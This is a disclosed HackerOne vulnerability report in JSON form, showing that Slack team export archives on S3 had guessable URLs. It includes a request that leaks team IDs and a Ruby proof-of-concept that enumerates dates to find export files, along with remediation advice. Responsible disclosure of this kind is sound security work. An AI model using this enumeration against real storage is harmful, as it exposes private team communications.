{
  "id": 2746,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNzQ2",
  "url": "https://hackerone.com/reports/2746",
  "title": "Data exports stored on S3 can be scraped easily",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2014-03-02T20:57:39.781Z",
  "submitted_at": "2014-03-02T20:57:39.781Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "jobert",
    "url": "/jobert",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 69,
    "url": "https://hackerone.com/slack",
    "handle": "slack",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Slack",
      "twitter_handle": "slackhq",
      "website": "https://slack.com",
      "about": "All your team communication in one place, instantly searchable, and available wherever you go."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2014-12-09T20:34:59.860Z",
  "bug_reporter_agreed_on_going_public_at": "2014-11-09T20:34:55.833Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "The URLs that are used to download the exports can be guessed easily by an attacker. The location of the export file is based on a date, a team ID and a team name:\r\n\r\n```\r\nhttp://s3-us-west-2.amazonaws.com/slack-files2/<team_id>/export/<date>/<name>%20Slack%20export%20<date>.zip\r\n```\r\n\r\nThe information an attacker needs, is the team its name and ID (the date needs to be enumerated). The information can be obtained due to a minor issue in the API (authentication). The following steps can be used to reproduce the issue.\r\n\r\n#Step 1: obtain team ID and team name\r\nThe team ID and team name can be obtained by abusing some minor information leakage in the `auth.start` API call. The following request and response give an example.\r\n\r\n**Request**\r\n\r\n```\r\nPOST /api/auth.start HTTP/1.1\r\n...\r\n\r\nemail=jobert@hackerone.com\r\n```\r\n\r\n**Response**\r\n\r\n```\r\nHTTP/1.1 200 OK\r\n...\r\n\r\n{\"ok\":true,\"email\":\"jobert@hackerone.com\",\"domain\":\"hackerone.com\",\"users\":[{\"url\":\"https:\\/\\/hackerone.slack.com\\/\",\"team\":\"HackerOne\",\"user\":\"jobert\",\"team_id\":\"T0254389F\",\"user_id\":\"U0254GYNR\"}],\"teams\":[],\"create\":\"https:\\/\\/slack.com\\/create?email=jobert%40hackerone.com\"}\r\n```\r\n\r\nAs can be seen in the JSON response, it contains the team ID (`T0254389F`) and a name (`HackerOne`) we need for the download links.\r\n\r\n#Step 2: scrape S3\r\nI wrote a rough PoC that scrapes S3 and shows the found exports (not something I'd use, just something I wrote for demonstration purposes -- feel free to use the team ID and name I mentioned before to check it out). \r\n\r\n``` ruby\r\nrequire 'date'\r\nrequire 'net/http'\r\nrequire 'uri'\r\n\r\nteam_id = ARGV[0]\r\nteam_name = ARGV[1]\r\n\r\ndef create_export_url(team_id, team_name, date)\r\n  date_dir  = date.strftime '%Y-%m-%d'\r\n  date_file = date.strftime('%b %-d %Y').gsub ' ', '%20'\r\n\r\n  \"http://s3-us-west-2.amazonaws.com/slack-files2/#{team_id}/\"\\\r\n  \"export/#{date_dir}/#{team_name}%20Slack%20export%20#{date_file}.zip\"\r\nend\r\n\r\ndate = Date.parse 'March 2nd, 2014'\r\n\r\n365.times do\r\n  uri      = URI create_export_url(team_id, team_name, date)\r\n  response = Net::HTTP.get_response uri\r\n\r\n  if response.is_a? Net::HTTPOK\r\n    puts \"FOUND AN EXPORT: #{uri}\"\r\n  end\r\n\r\n  date -= 1\r\nend\r\n```\r\n\r\nTo avoid these kind of issues, you could generate a link that [expires within a certain amount](http://css-tricks.com/snippets/php/generate-expiring-amazon-s3-link/) of time (let's say, `<time-export-completed>+30m`) or use random values in the filename if expiring is not an option (make sure you don't solely rely on \"public domain info\").",
  "weakness": {
    "id": 27,
    "name": "Improper Authentication - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2014-12-09T20:34:56.617Z",
  "allow_singular_disclosure_after": -289666171.17799014,
  "singular_disclosure_allowed": true,
  "vote_count": 8,
  "voters": [
    "sw33tlie",
    "sameerphad72",
    "ali",
    "eveeez",
    "shivammusic",
    "spetr0x",
    "cryptosector",
    "felipera"
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
